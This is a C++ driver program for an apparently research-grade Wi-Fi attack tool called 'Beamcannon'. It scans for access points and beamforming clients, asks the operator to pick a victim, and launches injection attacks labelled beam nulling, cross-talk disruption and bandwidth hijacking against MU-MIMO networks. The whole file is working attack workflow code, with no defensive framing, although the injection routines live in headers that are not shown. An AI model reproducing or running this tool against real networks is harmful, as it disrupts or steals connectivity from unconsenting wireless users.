#include <iostream>
#include <unistd.h>
#include "core_types.h"
#include "sniffer.h"
#include "injector.h"

void print_usage(const char* prog) {
    std::cerr << "Usage: " << prog << " -i <interface> [-d]\n";
    std::cerr << "  -i : Monitor mode interface (e.g., wlan1)\n";
    std::cerr << "  -d : Enable debug output\n";
}

int main(int argc, char* argv[]) {
    std::string iface = "";
    bool debug = false;
    int opt;

    while ((opt = getopt(argc, argv, "i:dh")) != -1) {
        switch (opt) {
            case 'i': iface = optarg; break;
            case 'd': debug = true; break;
            case 'h': default: print_usage(argv[0]); return 1;
        }
    }

    if (iface.empty()) {
        print_usage(argv[0]);
        return 1;
    }

    std::cout << "[*] Initializing Beamcannon on " << iface << " (Debug: " << (debug ? "ON" : "OFF") << ")\n";

    Sniffer sniffer(iface, debug);
    
    // Step 1: Scan for APs
    std::cout << "[*] Scanning for APs (10 seconds)...\n";
    auto aps = sniffer.scan_aps(10);
    if (aps.empty()) {
        std::cerr << "[-] No APs found.\n";
        return 1;
    }

    std::cout << "\n--- Discovered APs ---\n";
    for (size_t i = 0; i < aps.size(); ++i) {
        std::cout << "[" << i << "] " << aps[i].bssid << " | Ch: " << aps[i].channel << " | " << aps[i].ssid << "\n";
    }
    
    int ap_idx;
    std::cout << "\nSelect AP target: ";
    std::cin >> ap_idx;
    APInfo target_ap = aps[ap_idx];


    // Step 2: Choose Attack Mode
    std::cout << "\n--- Attack Modes ---\n";
    std::cout << "[1] SU-MIMO Pillage (Beam Nulling / Single Target Disruption)\n";
    std::cout << "[2] MU-MIMO Pillage (Cross-Talk Induction / Dual Target Disruption)\n";
    std::cout << "[3] MU-MIMO Plunder (Bandwidth Hijacking)\n";
    int mode_sel;
    std::cout << "Select Mode: ";
    std::cin >> mode_sel;
    AttackMode mode = AttackMode::NONE;
    if (mode_sel == 1) mode = AttackMode::SU_PILLAGE;
    if (mode_sel == 2) mode = AttackMode::MU_PILLAGE;
    if (mode_sel == 3) mode = AttackMode::MU_PLUNDER;

    // Step 3: Scan for Beamforming Clients
    std::cout << "\n[*] Scanning for BFI Clients on AP " << target_ap.bssid << "...\n";
    auto clients = sniffer.scan_clients(target_ap, 15);
    if (clients.empty()) {
        std::cerr << "[-] No MU-MIMO clients found sending feedback.\n";
        return 1;
    }

    std::cout << "\n--- Active Beamforming Clients ---\n";
    for (size_t i = 0; i < clients.size(); ++i) {
        std::cout << "[" << i << "] " << clients[i].mac << " | RSSI: " << clients[i].rssi << "\n";
    }

    int vic_idx;
    std::cout << "\nSelect Primary Victim Client: ";
    std::cin >> vic_idx;
    ClientInfo victim = clients[vic_idx];

    ClientInfo secondary_client;
    if (mode == AttackMode::MU_PILLAGE || mode == AttackMode::MU_PLUNDER) {
        int sec_idx;
        std::cout << (mode == AttackMode::MU_PILLAGE ? "Select Collateral Victim (Cross-Talk Target): " : "Select QM / Beneficiary Client: ");
        std::cin >> sec_idx;
        secondary_client = clients[sec_idx];
    }

    // Step 4: Execute Strategy
    Injector injector(iface, debug);
    if (mode == AttackMode::SU_PILLAGE) {
        std::cout << "\n[!] Launching SU-MIMO Pillage against " << victim.mac << "\n";
        injector.run_su_pillage(target_ap, victim);
    } else if (mode == AttackMode::MU_PILLAGE) {
        std::cout << "\n[!] Launching MU-MIMO Pillage (Cross-Talk) on " << victim.mac << " and " << secondary_client.mac << "\n";
        injector.run_mu_pillage(target_ap, victim, secondary_client);
    } else if (mode == AttackMode::MU_PLUNDER) {
        std::cout << "\n[!] Launching MU-MIMO Plunder against " << victim.mac << " for QM " << secondary_client.mac << "\n";
        injector.run_plunder(target_ap, victim, secondary_client);
    }

    return 0;
}
